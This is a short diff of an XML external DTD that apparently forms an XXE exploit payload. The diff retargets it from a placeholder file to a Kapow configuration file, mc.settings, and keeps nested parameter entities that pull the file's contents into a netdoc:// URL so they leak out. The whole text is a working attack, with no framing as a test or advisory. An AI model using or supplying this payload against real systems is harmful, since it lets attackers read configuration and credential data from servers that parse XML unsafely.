@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/afile">
+<!ENTITY % file SYSTEM "file:///kapow/data/Configuration/mc.settings">
 <!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'netdoc://nofile/%file;'>">
 %run;
 %exfil;
